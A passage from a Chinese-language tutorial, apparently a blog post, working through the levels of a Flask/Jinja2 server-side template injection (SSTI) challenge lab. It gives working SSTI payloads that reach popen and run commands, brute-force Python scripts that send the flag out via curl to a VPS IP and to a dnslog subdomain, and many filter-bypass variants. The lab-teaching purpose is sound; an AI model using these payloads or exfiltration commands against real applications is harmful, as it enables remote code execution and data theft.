    <span class="k">try</span><span class="p">:</span>
        <span class="n">url</span> <span class="o">=</span> <span class="s2">"http://xxx.xxx.xxx.xxxx:5000/level/3"</span>
        <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">"code"</span><span class="p">:</span><span class="s1">'{{().__class__.__bases__[0].__subclasses__()['</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s1">'].__init__.__globals__["popen"]("curl http://124.222.255.142:7777/`cat flag`").read()}}'</span><span class="p">}</span>
        <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>

    <span class="k">except</span><span class="p">:</span>
        <span class="k">pass</span>
</code></pre></div>

<p>然后在vps上监听7777端口即可<br>
<a href="./FLask SSTI从零到入门 - 跳跳糖_files/66562dae-002a-434b-a24c-192d81c5094e.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/66562dae-002a-434b-a24c-192d81c5094e.png"></a><br>
或者利用dns外带，也是可以的,构造脚本如下<br>
这个的话我们需要先了解一下dns这个东西，可以参考这篇文章<a href="https://xz.aliyun.com/t/9747" target="_blank">https://xz.aliyun.com/t/9747</a><br>
我们这里先测试一下，进入网站<a href="http://dnslog.cn/" target="_blank">http://dnslog.cn/</a><br>
点一下这个<br>
<a href="./FLask SSTI从零到入门 - 跳跳糖_files/3bca8a52-b9d4-48dc-9d3d-6c3ba6219583.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/3bca8a52-b9d4-48dc-9d3d-6c3ba6219583.png"></a><br>
出现了<code>mlbj8n.dnslog.cn</code><br>
此时我们打开cmd，利用ping命令执行一下命令</p>
<div class="highlight"><pre><span></span><code><span class="n">ping</span> <span class="o">%</span><span class="n">username</span><span class="o">%.</span><span class="n">mlbj8n</span><span class="o">.</span><span class="n">dnslog</span><span class="o">.</span><span class="n">cn</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/82585217-de9c-4180-93da-690c35e83258.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/82585217-de9c-4180-93da-690c35e83258.png"></a><br>
此时打开网站，点击这个<br>
<a href="./FLask SSTI从零到入门 - 跳跳糖_files/ce41976d-1b9e-4a2a-a2fb-f2205a61af78.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/ce41976d-1b9e-4a2a-a2fb-f2205a61af78.png"></a><br>
<a href="./FLask SSTI从零到入门 - 跳跳糖_files/2b69e561-e7ff-4cfd-bbec-c4b620a9d86a.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/2b69e561-e7ff-4cfd-bbec-c4b620a9d86a.png"></a><br>
可以发现将username回显了出来，也就是说它对里面的命令进行了解析，根据这点，我们这里同样也可以执行 <code>cat flag</code>这种语句，我们构造脚本如下</p>
<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">requests</span>

<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">'User-Agent'</span><span class="p">:</span><span class="s1">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36'</span><span class="p">}</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">500</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">url</span> <span class="o">=</span> <span class="s2">"http://192.168.134.132:5000/level/3"</span>
        <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">"code"</span><span class="p">:</span><span class="s1">'{{().__class__.__bases__[0].__subclasses__()['</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s1">'].__init__.__globals__["popen"]("curl http://`cat flag`.o78kma.dnslog.cn").read()}}'</span><span class="p">}</span>
        <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
        <span class="c1">#print(res.text)</span>
        <span class="k">if</span> <span class="s1">'correct'</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>

    <span class="k">except</span><span class="p">:</span>
        <span class="k">pass</span>
</code></pre></div>

<p>说是脚本，其实也就是在找到<code>os._wrap_close</code>类之后执行了一个curl语句而已，我们在知道这个类的位置后，可以直接进行攻击，构造如下payload</p>
<div class="highlight"><pre><span></span><code><span class="p">{{()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">133</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s2">"popen"</span><span class="p">](</span><span class="s2">"curl http://`cat flag`.o78kma.dnslog.cn"</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/c9bc0e7e-cb6d-4f79-a456-fa55f738c112.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/c9bc0e7e-cb6d-4f79-a456-fa55f738c112.png"></a></p>
<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/63195210-5f10-4d2e-8ec8-7cedd8b7141c.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/63195210-5f10-4d2e-8ec8-7cedd8b7141c.png"></a></p>
<h3 id="toc_level-4"><a href="https://tttang.com/archive/1698/#toc_level-4">level 4</a></h3>
<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/320de3ba-660d-44fe-8f96-8529fafe2b81.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/320de3ba-660d-44fe-8f96-8529fafe2b81.png"></a><br>
题目描述，过滤了<code>[]</code>中括号，这里的话可以用<code>__getitem()__</code>来代替[]，简单一点理解的话，如下所示</p>
<div class="highlight"><pre><span></span><code><span class="s2">""</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="s2">""</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="o">.</span><span class="fm">__getitem__</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</code></pre></div>

<p>所以这里的话，我们简单修改一下之前的脚本就可以继续执行了</p>
<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">requests</span>

<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">'User-Agent'</span><span class="p">:</span><span class="s1">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36'</span><span class="p">}</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">500</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">url</span> <span class="o">=</span> <span class="s2">"http://192.168.134.132:5000/level/4"</span>
        <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">"code"</span><span class="p">:</span><span class="s1">'{{().__class__.__base__.__subclasses__().__getitem__('</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s1">').__init__.__globals__.__getitem__("popen")("cat flag").read()}}'</span><span class="p">}</span>
        <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
        <span class="k">if</span> <span class="s1">'Hello'</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>

    <span class="k">except</span><span class="p">:</span>
        <span class="k">pass</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/cb1d355d-e563-421d-a317-644df75fceed.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/cb1d355d-e563-421d-a317-644df75fceed.png"></a></p>
<h3 id="toc_level-5"><a href="https://tttang.com/archive/1698/#toc_level-5">level 5</a></h3>
<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/552fdfeb-8919-4fb1-a564-e55eec5f7821.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/552fdfeb-8919-4fb1-a564-e55eec5f7821.png"></a><br>
题目说过滤了单引号和双引号，这里的话就可以考虑使用<code>request.arg.a</code>，然后发送GEt请求<code>a=xxx</code>这种方式来实现绕过<br>
我们这次使用这个payload</p>
<div class="highlight"><pre><span></span><code><span class="p">{{</span><span class="n">c</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'__builtins__'</span><span class="p">]</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s1">'flag'</span><span class="p">,</span> <span class="s1">'r'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
</code></pre></div>

<p>构造payload如下</p>
<div class="highlight"><pre><span></span><code><span class="n">GET</span><span class="p">:</span><span class="n">a</span><span class="o">=</span><span class="n">__builtins__</span><span class="o">&amp;</span><span class="n">b</span><span class="o">=</span><span class="n">flag</span><span class="o">&amp;</span><span class="n">c</span><span class="o">=</span><span class="n">r</span>
<span class="n">POST</span><span class="p">:</span><span class="n">code</span><span class="o">=</span><span class="p">{{</span><span class="n">c</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">a</span><span class="p">]</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">b</span><span class="p">,</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">c</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/913853b9-70ba-464d-92e6-402fb8321955.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/913853b9-70ba-464d-92e6-402fb8321955.png"></a><br>
当然，也可以利用<code>request.cookie.a</code>这种，两者实质是相同的，不再演示</p>
<h3 id="toc_level-6"><a href="https://tttang.com/archive/1698/#toc_level-6">level 6</a></h3>
<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/fc18471c-8921-4edc-b6d2-a6c009bf1ca9.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/fc18471c-8921-4edc-b6d2-a6c009bf1ca9.png"></a><br>
题目描述，过滤了下划线<br>
依旧可以同上关一样，借助request实现，我们这里换一个语句</p>
<div class="highlight"><pre><span></span><code><span class="p">{{()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">133</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'popen'</span><span class="p">](</span><span class="s1">'cat flag'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
</code></pre></div>

<p>构造出来的payload</p>
<div class="highlight"><pre><span></span><code><span class="n">GET</span><span class="p">:</span><span class="n">cla</span><span class="o">=</span><span class="vm">__class__</span><span class="o">&amp;</span><span class="n">bas</span><span class="o">=</span><span class="n">__base__</span><span class="o">&amp;</span><span class="n">sub</span><span class="o">=</span><span class="n">__subclasses__</span><span class="o">&amp;</span><span class="n">ini</span><span class="o">=</span><span class="fm">__init__</span><span class="o">&amp;</span><span class="n">glo</span><span class="o">=</span><span class="vm">__globals__</span><span class="o">&amp;</span><span class="n">gei</span><span class="o">=</span><span class="fm">__getitem__</span>
<span class="n">POST</span><span class="p">:</span><span class="n">code</span><span class="o">=</span><span class="p">{{()</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">cla</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">bas</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">sub</span><span class="p">)()</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">gei</span><span class="p">)(</span><span class="mi">133</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">ini</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">glo</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">gei</span><span class="p">)(</span><span class="s1">'popen'</span><span class="p">)(</span><span class="s1">'cat flag'</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">'read'</span><span class="p">)()}}</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/5246ab01-86d1-4850-8253-709fb100f975.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/5246ab01-86d1-4850-8253-709fb100f975.png"></a><br>
也可以用十六进制结合过滤器attr()来进行绕过，举个例子</p>
<div class="highlight"><pre><span></span><code><span class="s2">""</span><span class="o">.</span><span class="vm">__class__</span><span class="o">=</span><span class="s2">""</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="vm">__class__</span><span class="p">)</span><span class="o">=</span><span class="s2">""</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"</span><span class="se">\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f</span><span class="s2">"</span><span class="p">)</span>
</code></pre></div>

<p>那么这里的话我们就可以把下划线进行十六进制编码绕过<br>
原payload</p>
<div class="highlight"><pre><span></span><code><span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">133</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'popen'</span><span class="p">](</span><span class="s1">'cat flag'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</code></pre></div>

<p>中括号这里用getitem转换为括号</p>
<div class="highlight"><pre><span></span><code><span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span><span class="o">.</span><span class="fm">__getitem__</span><span class="p">(</span><span class="mi">133</span><span class="p">)</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="fm">__getitem__</span><span class="p">(</span><span class="s1">'popen'</span><span class="p">)(</span><span class="s1">'cat flag'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</code></pre></div>

<p>转换过后的</p>
<div class="highlight"><pre><span></span><code><span class="p">{{()</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"</span><span class="se">\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f</span><span class="s2">"</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"</span><span class="se">\x5f\x5f\x62\x61\x73\x65\x5f\x5f</span><span class="s2">"</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"</span><span class="se">\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f</span><span class="s2">"</span><span class="p">)()</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"</span><span class="se">\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f</span><span class="s2">"</span><span class="p">)(</span><span class="mi">133</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"</span><span class="se">\x5f\x5f\x69\x6e\x69\x74\x5f\x5f</span><span class="s2">"</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"</span><span class="se">\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f</span><span class="s2">"</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"</span><span class="se">\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f</span><span class="s2">"</span><span class="p">)(</span><span class="s1">'popen'</span><span class="p">)(</span><span class="s1">'cat flag'</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"read"</span><span class="p">)()}}</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/949d68da-8f0d-40cf-8629-0c1b3878c960.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/949d68da-8f0d-40cf-8629-0c1b3878c960.png"></a></p>
<h3 id="toc_level-7"><a href="https://tttang.com/archive/1698/#toc_level-7">level 7</a></h3>
<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/ae13693f-816d-493f-8f48-4bf7f4d2d439.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/ae13693f-816d-493f-8f48-4bf7f4d2d439.png"></a><br>
题目描述过滤了<code>.</code>，这个时候就需要用到过滤器<code>attr()</code>了，上一关已经提及并简单使用过，这里再用代码复述一下其作用</p>
<div class="highlight"><pre><span></span><code><span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">=</span><span class="p">()</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="vm">__class__</span><span class="p">)</span>
</code></pre></div>

<p>因此这里的话我们只需要将<code>.</code>用<code>attr()</code>进行替换即可<br>
原payload</p>
<div class="highlight"><pre><span></span><code><span class="p">{{()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">133</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'popen'</span><span class="p">](</span><span class="s1">'cat flag'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
</code></pre></div>

<p>修改过后的payload如下</p>
<div class="highlight"><pre><span></span><code><span class="n">code</span><span class="o">=</span><span class="p">{{()</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"__class__"</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"__base__"</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"__subclasses__"</span><span class="p">)()</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"__getitem__"</span><span class="p">)(</span><span class="mi">133</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"__init__"</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"__globals__"</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"__getitem__"</span><span class="p">)(</span><span class="s1">'popen'</span><span class="p">)(</span><span class="s1">'cat flag'</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">'read'</span><span class="p">)()}}</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/f888e9a3-b950-486b-a649-43fbe3cff2b7.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/f888e9a3-b950-486b-a649-43fbe3cff2b7.png"></a></p>
<h3 id="toc_level-8"><a href="https://tttang.com/archive/1698/#toc_level-8">level 8</a></h3>
<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/0a867607-eb1c-4a43-affc-2461e2c112b4.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/0a867607-eb1c-4a43-affc-2461e2c112b4.png"></a><br>
这关过滤的有点多，很多关键词都被ban了，这个时候可以考虑用字符拼接的方式</p>
<div class="highlight"><pre><span></span><code><span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">=</span><span class="p">()[</span><span class="s2">"__cla"</span><span class="o">+</span><span class="s2">"ss__"</span><span class="p">]</span> <span class="o">//</span><span class="n">这里的点被中括号代替了</span>
</code></pre></div>

<p>原payload</p>
<div class="highlight"><pre><span></span><code><span class="s2">""</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">133</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'popen'</span><span class="p">](</span><span class="s1">'cat flag'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</code></pre></div>

<p>修改过后的payload</p>
<div class="highlight"><pre><span></span><code><span class="p">{{</span><span class="s2">""</span><span class="p">[</span><span class="s2">"__cla"</span><span class="o">+</span><span class="s2">"ss__"</span><span class="p">][</span><span class="s2">"__ba"</span><span class="o">+</span><span class="s2">"se__"</span><span class="p">][</span><span class="s2">"__subcla"</span><span class="o">+</span><span class="s2">"sses__"</span><span class="p">]()[</span><span class="mi">133</span><span class="p">][</span><span class="s2">"__in"</span><span class="o">+</span><span class="s2">"it__"</span><span class="p">][</span><span class="s2">"__glo"</span><span class="o">+</span><span class="s2">"bals__"</span><span class="p">][</span><span class="s1">'po'</span><span class="o">+</span><span class="s1">'pen'</span><span class="p">](</span><span class="s1">'cat flag'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/43e5983b-c086-4b7e-b461-6f76c7e51e8d.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/43e5983b-c086-4b7e-b461-6f76c7e51e8d.png"></a><br>
或者这里也可以使用for+if语句</p>
<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="o">%</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="s2">""</span><span class="p">[</span><span class="s2">"__cla"</span><span class="o">+</span><span class="s2">"ss__"</span><span class="p">][</span><span class="s2">"__mr"</span><span class="o">+</span><span class="s2">"o__"</span><span class="p">][</span><span class="mi">1</span><span class="p">][</span><span class="s2">"__subcla"</span><span class="o">+</span><span class="s2">"sses__"</span><span class="p">]()</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="k">if</span> <span class="n">i</span><span class="o">.</span><span class="vm">__name__</span> <span class="o">==</span> <span class="s2">"_wrap_close"</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="nb">print</span> <span class="n">i</span><span class="p">[</span><span class="s2">"__in"</span><span class="o">+</span><span class="s2">"it__"</span><span class="p">][</span><span class="s2">"__glo"</span><span class="o">+</span><span class="s2">"bals__"</span><span class="p">][</span><span class="s2">"po"</span><span class="o">+</span><span class="s2">"pen"</span><span class="p">](</span><span class="s1">'cat flag'</span><span class="p">)[</span><span class="s2">"read"</span><span class="p">]()</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="n">endif</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span><span class="n">endfor</span><span class="o">%</span><span class="p">}</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/b6634ba4-f842-4074-8015-f0b69f29431e.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/b6634ba4-f842-4074-8015-f0b69f29431e.png"></a></p>
<p>这里也可以考虑使用join()过滤器，它可以将字符串进行拼接，举个例子</p>
<div class="highlight"><pre><span></span><code><span class="nb">dict</span><span class="p">(</span><span class="n">__in</span><span class="o">=</span><span class="n">a</span><span class="p">,</span><span class="n">it__</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span>  <span class="o">=</span><span class="fm">__init__</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/09fcc953-c713-4036-a2ac-34951ec84705.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/09fcc953-c713-4036-a2ac-34951ec84705.png"></a><br>
我们构造payload如下</p>
<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">a</span><span class="o">=</span><span class="nb">dict</span><span class="p">(</span><span class="n">__cla</span><span class="o">=</span><span class="n">a</span><span class="p">,</span><span class="n">ss__</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">b</span><span class="o">=</span><span class="nb">dict</span><span class="p">(</span><span class="n">__ba</span><span class="o">=</span><span class="n">a</span><span class="p">,</span><span class="n">se__</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">c</span><span class="o">=</span><span class="nb">dict</span><span class="p">(</span><span class="n">__subcla</span><span class="o">=</span><span class="n">a</span><span class="p">,</span><span class="n">sses__</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">d</span><span class="o">=</span><span class="nb">dict</span><span class="p">(</span><span class="n">__in</span><span class="o">=</span><span class="n">a</span><span class="p">,</span><span class="n">it__</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">e</span><span class="o">=</span><span class="nb">dict</span><span class="p">(</span><span class="n">__glo</span><span class="o">=</span><span class="n">a</span><span class="p">,</span><span class="n">bals__</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">h</span><span class="o">=</span><span class="nb">dict</span><span class="p">(</span><span class="n">po</span><span class="o">=</span><span class="n">a</span><span class="p">,</span><span class="n">pen</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span><span class="nb">print</span><span class="p">(</span><span class="s2">""</span><span class="p">[</span><span class="n">a</span><span class="p">][</span><span class="n">b</span><span class="p">][</span><span class="n">c</span><span class="p">]()[</span><span class="mi">133</span><span class="p">][</span><span class="n">d</span><span class="p">][</span><span class="n">e</span><span class="p">][</span><span class="n">h</span><span class="p">](</span><span class="s1">'cat flag'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span><span class="o">%</span><span class="p">}</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/72143475-187d-4d17-ab0b-f616e75c3bd2.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/72143475-187d-4d17-ab0b-f616e75c3bd2.png"></a><br>
同样，还可以利用其他过滤器进行此类操作，例如</p>
<div class="highlight"><pre><span></span><code><span class="n">使用reverse过滤器</span><span class="o">.</span><span class="n">它的作用是反置字符串</span><span class="err">，</span><span class="n">举个例子</span>
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">a</span><span class="o">=</span><span class="s2">"__tini__"</span><span class="o">|</span><span class="n">reverse</span><span class="o">%</span><span class="p">}</span>
